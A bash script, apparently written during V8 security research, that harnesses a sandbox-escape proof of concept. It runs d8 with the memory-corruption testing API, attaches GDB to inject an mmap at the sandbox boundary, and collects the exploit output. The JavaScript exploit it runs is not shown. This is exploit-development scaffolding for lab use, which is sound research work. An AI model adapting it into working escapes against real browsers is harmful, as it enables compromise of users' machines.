#!/bin/bash
# GDB-assisted V8 sandbox escape PoC
# Injects mmap at SB_END from outside the process, then lets JS continue
set -euo pipefail

SCRATCHPAD="/tmp/claude-0/-home-user-v8/0a56e469-9325-5fcf-aacd-fda80b17646b/scratchpad"
D8="/tmp/d8_build_mca/d8"
POC="$SCRATCHPAD/heap_escape_success.js"
OUT="$SCRATCHPAD/d8_out.txt"

echo "[*] Starting d8 PoC in background..."
"$D8" --expose-memory-corruption-api --allow-natives-syntax "$POC" > "$OUT" 2>&1 &
D8_PID=$!
echo "[*] d8 PID = $D8_PID"

# Wait for INJECT line (up to 15s)
echo "[*] Waiting for INJECT signal..."
for i in $(seq 1 150); do
    sleep 0.1
    if grep -q '^INJECT:' "$OUT" 2>/dev/null; then break; fi
    if ! kill -0 $D8_PID 2>/dev/null; then
        echo "[-] d8 exited before INJECT signal"
        cat "$OUT"
        exit 1
    fi
done

INJECT_LINE=$(grep '^INJECT:' "$OUT" | head -1)
if [[ -z "$INJECT_LINE" ]]; then
    echo "[-] No INJECT signal received"
    cat "$OUT"
    kill $D8_PID 2>/dev/null
    exit 1
fi

SB_END_HEX="${INJECT_LINE#INJECT:}"
SB_END_DEC=$(python3 -c "print(int('$SB_END_HEX', 16))")
echo "[*] SB_END = 0x$SB_END_HEX ($SB_END_DEC)"
echo "[*] Target = 0x$(python3 -c "print(hex(int('$SB_END_HEX',16)+4)[2:])")"

# MAP_PRIVATE=0x02 | MAP_ANONYMOUS=0x20 | MAP_FIXED=0x10 = 0x32
# PROT_READ=0x1 | PROT_WRITE=0x2 = 0x3
echo "[*] Injecting mmap(SB_END=0x$SB_END_HEX, 4096, PROT_RW, MAP_PRIVATE|ANON|FIXED, -1, 0) via GDB..."

GDB_SCRIPT="$SCRATCHPAD/inject.gdb"
cat > "$GDB_SCRIPT" << GDBEOF
set pagination off
set print inferior-events off
attach $D8_PID
call (long)mmap((void*)0x${SB_END_HEX}ULL, (long)4096, 3, 0x32, -1, 0)
printf "mmap result: 0x%lx\n", (long)\$1
detach
quit
GDBEOF

GDB_OUT="$SCRATCHPAD/gdb_out.txt"
gdb -batch -x "$GDB_SCRIPT" > "$GDB_OUT" 2>&1
echo "[*] GDB output:"
cat "$GDB_OUT"

# Check mmap succeeded
if grep -q "0x${SB_END_HEX}" "$GDB_OUT"; then
    echo "[+] mmap at SB_END succeeded!"
elif grep -q "mmap result" "$GDB_OUT"; then
    MMAP_RESULT=$(grep "mmap result" "$GDB_OUT" | head -1)
    echo "[*] $MMAP_RESULT"
fi

echo "[*] Waiting for d8 to finish (spin loop ends in ~20s total)..."
wait $D8_PID || true

echo ""
echo "═══════════════ PoC OUTPUT ═══════════════"
cat "$OUT"
echo "═══════════════════════════════════════════"
